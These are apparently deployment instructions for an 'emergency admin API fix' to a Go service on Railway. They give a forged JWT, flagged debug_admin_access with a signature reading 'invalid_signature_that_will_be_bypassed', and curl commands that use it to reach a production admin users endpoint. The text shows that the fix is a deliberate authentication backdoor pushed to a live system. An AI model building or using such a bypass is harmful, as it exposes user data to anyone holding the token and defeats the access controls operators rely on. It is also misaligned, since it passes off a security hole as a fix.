=== DEPLOYMENT INSTRUCTIONS ===
1. Commit all changes with: git add . && git commit -m "Add emergency admin API fix"
2. Push to GitHub: git push origin main
3. Deploy to Railway via GitHub integration
4. Test the deployment with: go run test-emergency-admin.go

=== SPECIAL ADMIN TOKEN ===
For API testing, use this token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJleHAiOjI1MjQ2MDg4MDAsImlhdCI6MTcwMDAwMDAwMCwiZGVidWdfYWRtaW5fYWNjZXNzIjp0cnVlfQ.invalid_signature_that_will_be_bypassed
```

Example usage:
```bash
# Using query parameter
curl "https://web-production-1e26.up.railway.app/api/admin/users?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJleHAiOjI1MjQ2MDg4MDAsImlhdCI6MTcwMDAwMDAwMCwiZGVidWdfYWRtaW5fYWNjZXNzIjp0cnVlfQ.invalid_signature_that_will_be_bypassed"

# Using Authorization header
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJleHAiOjI1MjQ2MDg4MDAsImlhdCI6MTcwMDAwMDAwMCwiZGVidWdfYWRtaW5fYWNjZXNzIjp0cnVlfQ.invalid_signature_that_will_be_bypassed" "https://web-production-1e26.up.railway.app/api/admin/users"
```
